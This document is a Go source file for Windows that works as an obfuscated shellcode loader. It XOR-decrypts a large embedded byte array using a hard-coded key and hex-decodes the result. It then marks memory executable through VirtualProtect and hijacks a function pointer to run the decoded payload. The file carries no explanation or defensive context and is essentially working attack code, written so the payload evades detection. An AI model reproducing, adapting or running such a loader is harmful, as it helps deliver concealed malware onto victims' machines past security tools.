package main

import (
        "encoding/hex"
		"syscall"
		"unsafe"
		"os"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func Run(sc []byte) {

	f := func() {}

	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}

	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}

	f()
}


func main() { 


	encrypted_array := []byte{83, 86, 109, 113, 76, 82, 19, 2, 81, 100, 36, 74, 54, 22, 114, 96, 5, 5, 105, 121, 64, 80, 67, 7, 3, 101, 116, 66, 96, 71, 119, 97, 0, 3, 109, 113, 71, 80, 18, 4, 1, 97, 117, 74, 109, 23, 119, 98, 3, 5, 109, 113, 76, 3, 67, 4, 6, 108, 117, 74, 109, 23, 119, 98, 7, 5, 109, 45, 71, 80, 21, 15, 3, 108, 121, 16, 98, 71, 119, 96, 1, 13, 105, 47, 22, 86, 66, 87, 3, 53, 117, 74, 102, 68, 33, 96, 84, 86, 106, 42, 66, 80, 65, 85, 7, 102, 115, 17, 103, 69, 118, 97, 86, 4, 58, 112, 68, 5, 66, 7, 7, 101, 34, 67, 48, 71, 39, 52, 0, 7, 109, 120, 65, 80, 66, 14, 15, 54, 116, 64, 103, 69, 122, 50, 1, 7, 106, 42, 64, 89, 70, 7, 83, 100, 119, 68, 109, 68, 117, 104, 4, 13, 105, 43, 68, 83, 70, 80, 15, 97, 118, 64, 101, 69, 114, 96, 5, 5, 97, 43, 76, 81, 78, 14, 7, 100, 113, 66, 101, 69, 118, 104, 13, 0, 58, 121, 67, 85, 64, 1, 3, 108, 113, 67, 49, 69, 118, 100, 13, 87, 109, 121, 70, 81, 66, 15, 7, 101, 37, 66, 109, 23, 118, 104, 4, 13, 108, 121, 17, 82, 67, 0, 3, 108, 39, 20, 54, 76, 118, 97, 13, 87, 106, 125, 76, 89, 66, 14, 7, 101, 37, 68, 97, 17, 113, 97, 86, 12, 109, 113, 71, 80, 21, 6, 3, 101, 34, 67, 54, 76, 114, 52, 84, 86, 109, 120, 68, 80, 21, 7, 4, 108, 36, 66, 98, 64, 36, 97, 1, 86, 105, 122, 64, 2, 68, 2, 7, 108, 117, 71, 102, 76, 38, 97, 2, 0, 61, 113, 65, 89, 66, 2, 15, 54, 117, 66, 103, 65, 118, 105, 5, 4, 61, 121, 66, 87, 66, 7, 15, 54, 113, 17, 97, 77, 118, 100, 13, 87, 109, 121, 69, 2, 66, 15, 7, 101, 37, 66, 97, 68, 122, 50, 5, 1, 97, 113, 64, 89, 70, 7, 83, 100, 117, 67, 96, 77, 118, 97, 0, 13, 108, 44, 65, 88, 67, 87, 3, 101, 116, 74, 97, 68, 119, 105, 1, 4, 108, 40, 64, 89, 78, 5, 82, 55, 115, 66, 97, 68, 119, 98, 83, 83, 60, 121, 65, 89, 66, 7, 2, 109, 116, 19, 97, 77, 122, 50, 4, 7, 60, 112, 64, 3, 16, 80, 81, 50, 39, 20, 96, 17, 118, 104, 6, 4, 61, 43, 65, 82, 66, 15, 85, 49, 118, 69, 99, 76, 116, 53, 3, 12, 111, 44, 66, 84, 65, 2, 7, 100, 117, 67, 96, 67, 118, 104, 13, 12, 60, 120, 64, 88, 21, 1, 84, 102, 117, 17, 98, 66, 112, 102, 5, 2, 63, 47, 16, 84, 67, 5, 2, 103, 117, 74, 109, 76, 39, 97, 0, 6, 108, 40, 64, 5, 69, 7, 84, 100, 117, 22, 102, 68, 33, 105, 0, 6, 108, 122, 64, 88, 20, 87, 4, 53, 116, 68, 98, 76, 35, 103, 5, 5, 105, 121, 68, 81, 70, 6, 81, 50, 37, 71, 48, 77, 114, 52, 5, 5, 105, 121, 68, 81, 69, 7, 4, 109, 114, 64, 103, 16, 113, 97, 6, 3, 106, 113, 70, 4, 69, 7, 5, 49, 114, 67, 102, 71, 114, 96, 0, 84, 109, 113, 76, 88, 21, 7, 3, 109, 34, 69, 54, 69, 119, 96, 5, 5, 105, 121, 68, 81, 66, 82, 4, 101, 34, 75, 96, 70, 119, 99, 3, 84, 105, 122, 65, 82, 66, 15, 85, 53, 116, 69, 109, 76, 123, 54, 86, 3, 105, 121, 68, 81, 70, 6, 7, 100, 39, 20, 49, 64, 39, 104, 80, 12, 105, 121, 68, 81, 70, 6, 5, 50, 114, 74, 99, 19, 116, 103, 1, 87, 109, 45, 64, 2, 64, 80, 1, 101, 119, 64, 98, 68, 112, 52, 3, 83, 108, 120, 71, 87, 64, 85, 3, 102, 118, 75, 97, 19, 116, 101, 3, 13, 111, 126, 64, 80, 64, 82, 2, 97, 116, 67, 102, 77, 119, 102, 0, 1, 110, 124, 65, 81, 66, 85, 3, 50, 117, 22, 96, 68, 116, 97, 0, 83, 111, 120, 71, 84, 66, 85, 3, 49, 119, 20, 99, 68, 118, 51, 6, 3, 108, 123, 71, 82, 69, 2, 2, 99, 117, 17, 99, 71, 113, 97, 1, 12, 109, 44, 66, 89, 65, 5, 2, 53, 116, 19, 99, 19, 119, 101, 0, 2, 111, 40, 64, 4, 64, 82, 3, 102, 118, 64, 97, 77, 118, 97, 3, 7, 111, 125, 65, 86, 68, 82, 0, 97, 119, 69, 99, 66, 119, 54, 2, 4, 111, 123, 64, 80, 67, 7, 1, 48, 117, 69, 99, 68, 119, 100, 2, 3, 106, 123, 66, 7, 64, 0, 3, 101, 116, 64, 97, 22, 119, 103, 2, 5, 111, 125, 65, 89, 67, 80, 0, 99, 119, 16, 97, 19, 119, 104, 0, 6, 108, 123, 66, 7, 64, 7, 0, 109, 114, 69, 96, 68, 118, 98, 0, 3, 111, 123, 64, 4, 66, 2, 5, 48, 117, 70, 98, 65, 119, 105, 2, 84, 111, 42, 66, 3, 64, 5, 0, 102, 118, 70, 99, 67, 116, 101, 6, 2, 109, 125, 67, 83, 66, 15, 1, 109, 119, 69, 96, 67, 118, 100, 3, 83, 110, 113, 65, 88, 67, 5, 0, 102, 117, 22, 98, 64, 117, 102, 3, 3, 106, 127, 70, 5, 64, 3, 4, 99, 119, 68, 97, 64, 116, 105, 1, 84, 106, 123, 64, 2, 67, 80, 3, 102, 119, 22, 96, 76, 118, 49, 0, 12, 108, 113, 64, 88, 66, 2, 2, 103, 117, 67, 97, 68, 118, 100, 2, 6, 109, 47, 71, 86, 66, 85, 3, 101, 119, 16, 97, 76, 116, 51, 1, 12, 111, 124, 64, 5, 65, 7, 4, 101, 118, 70, 96, 69, 119, 98, 3, 13, 108, 47, 66, 85, 64, 3, 4, 108, 119, 71, 96, 66, 118, 97, 7, 81, 110, 121, 71, 86, 69, 14, 3, 50, 116, 64, 102, 76, 113, 101, 1, 7, 109, 120, 64, 88, 69, 5, 3, 50, 116, 20, 98, 69, 116, 100, 1, 12, 108, 127, 67, 87, 67, 3, 0, 100, 119, 20, 97, 68, 113, 96, 3, 80, 109, 122, 66, 86, 65, 87, 0, 102, 116, 68, 98, 20, 117, 96, 1, 6, 109, 44, 66, 2, 66, 2, 0, 108, 117, 71, 96, 70, 116, 52, 6, 12, 108, 127, 71, 83, 64, 80, 7, 100, 117, 74, 109, 76, 33, 97, 0, 6, 108, 40, 64, 80, 67, 14, 3, 48, 114, 67, 54, 76, 119, 99, 1, 13, 59, 113, 68, 81, 70, 4, 5, 108, 121, 70, 101, 69, 114, 96, 5, 5, 105, 121, 65, 81, 67, 5, 2, 103, 117, 75, 54, 66, 33, 98, 80, 87, 108, 124, 70, 4, 69, 84, 81, 50, 37, 71, 97, 77, 122, 105, 86, 3, 111, 40, 68, 0, 67, 80, 2, 103, 116, 19, 97, 77, 122, 105, 83, 4, 109, 45, 71, 80, 21, 15, 3, 48, 114, 67, 54, 76, 119, 99, 0, 6, 109, 112, 23, 86, 21, 4, 5, 48, 113, 68, 100, 77, 117, 50, 83, 83, 61, 124, 76, 84, 21, 6, 0, 97, 112, 20, 97, 77, 33, 103, 86, 4, 97, 113, 69, 82, 70, 6, 7, 100, 117, 75, 55, 20, 118, 100, 83, 5, 106, 124, 17, 81, 70, 6, 7, 100, 113, 66, 101, 69, 36, 54, 81, 0, 109, 113, 18, 7, 21, 80, 0, 96, 113, 64, 48, 23, 33, 51, 80, 13, 108, 124, 68, 81, 70, 6, 7, 100, 116, 65, 96, 76, 116, 49, 1, 5, 108, 40, 64, 88, 78, 15, 83, 101, 34, 67, 48, 71, 115, 96, 1, 12, 58, 126, 23, 81, 70, 6, 6, 100, 113, 66, 101, 69, 118, 105, 87, 84, 108, 113, 21, 85, 67, 5, 82, 97, 113, 66, 101, 69, 114, 96, 5, 5, 63, 47, 16, 84, 66, 14, 14, 103, 116, 65, 96, 70, 118, 104, 13, 12, 60, 126, 64, 89, 78, 15, 81, 101, 117, 74, 109, 76, 38, 49, 1, 12, 58, 126, 23, 81, 70, 6, 5, 100, 113, 66, 101, 69, 118, 105, 13, 12, 63, 112, 64, 88, 20, 87, 6, 102, 120, 68, 109, 76, 39, 98, 5, 5, 105, 121, 68, 81, 70, 6, 81, 50, 37, 71, 97, 77, 122, 99, 86, 1, 107, 121, 76, 84, 21, 6, 0, 96, 35, 64, 99, 67, 122, 50, 5, 2, 109, 113, 68, 80, 21, 5, 15, 97, 34, 66, 98, 64, 38, 98, 0, 13, 58, 122, 65, 89, 64, 87, 7, 100, 116, 75, 55, 23, 39, 96, 4, 81, 107, 40, 68, 0, 66, 7, 15, 109, 37, 19, 51, 19, 38, 101}
	decrypt_output := ""
	key := "55YItav67TArUuBP"
	
	
	for i := 0; i < len(encrypted_array); i++ {
                decrypt_output += string(encrypted_array[i] ^ key[i % len(key)])
    }

	scBin, err := hex.DecodeString(decrypt_output)
	if err != nil {
			os.Exit(1)
		}
		
	Run(scBin)
} 